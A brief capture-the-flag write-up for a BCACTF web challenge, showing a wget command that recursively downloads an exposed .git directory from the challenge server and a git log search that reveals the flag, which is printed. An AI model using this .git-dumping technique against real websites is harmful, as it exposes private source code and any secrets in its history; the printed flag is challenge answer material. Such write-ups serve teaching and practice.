
# Source Under Control

It's my first time using Git. Hopefully nothing went unseen.


http://challs.bcactf.com:28973/


## Solve


```

wget -r -np http://challs.bcactf.com:28973/.git/



git log -p | grep -iE "bcactf\{.*\}"
-<p>bcactf{oops_didnt_mean_to_serve_that_c06677d3437e}</p>
+<p>bcactf{oops_didnt_mean_to_serve_that_c06677d3437e}</p>

```
